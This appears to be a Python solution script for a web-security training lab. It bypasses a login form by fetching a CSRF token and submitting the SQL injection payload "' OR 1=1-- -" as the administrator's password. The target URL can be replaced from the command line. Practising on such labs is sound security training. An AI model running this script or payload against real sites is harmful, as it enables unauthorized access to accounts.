# Batch import libs. I know this is messy behavior but it's for quick prototyping.
import requests
from base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode
from time import time
import re
import subprocess
from concurrent.futures import ThreadPoolExecutor
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from http import cookies
import sys


# Exercise - SQL injection vulnerability allowing login bypass
# This lab contains a SQL injection vulnerability in the login function.
# To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 


###################### Meat & Potatoes ######################

BASE_URL = "https://0afc009704962ebe80b4e0fc00ba0006.web-security-academy.net/"
session = requests.Session()

def login():
    url = BASE_URL + "/login"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Referer": url,
        "Origin": BASE_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    # GET the login page to obtain session cookie + CSRF token
    r_get = session.get(url, headers=headers, allow_redirects=True)
    print("GET status:", r_get.status_code)
    # show session cookies obtained automatically
    print("cookies:", session.cookies.get_dict())

    # try to extract CSRF token from common patterns
    csrf = None # stablish the variable
    # common hidden input name="csrf" value="..."
    m = re.search(r'<input[^>]+name=["\']csrf(?:_|-)?(?:token)?["\'][^>]*value=["\']([^"\']+)["\']', r_get.text, re.I)
    if not m:
        # fallback: any hidden input where name contains csrf
        m = re.search(r'<input[^>]+value=["\']([^"\']+)["\'][^>]*name=["\'][^"\']*csrf[^"\']*["\']', r_get.text, re.I)
    if not m:
        # meta tag pattern
        m = re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']', r_get.text, re.I)
    if m:
        csrf = m.group(1)
        print("Found CSRF token:", csrf)
    else:
        print("CSRF token not found in login page; aborting.")
        return

    # payload (un-URL-encoded) - perform SQL injection for login bypass
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": "' OR 1=1-- -"
    }

    # ensure Referer set to login page for the POST
    headers["Referer"] = url

    r = session.post(url, data=data, headers=headers, allow_redirects=True)
    print("POST /login status:", r.status_code)

     # quick check for a successful admin login (adjust based on actual page content)
    if "Log out" in r.text or "administrator" in r.text:
        print("Likely logged in as administrator")
    else:
        print("Login failed or response did not indicate success")



def main():
    # Allow BASE_URL to be modified via command line
    global BASE_URL
    if len(sys.argv) > 1:
        BASE_URL = sys.argv[1].rstrip("/") + "/"
    
    # Call the login function
    login()


if __name__ == "__main__":
    main()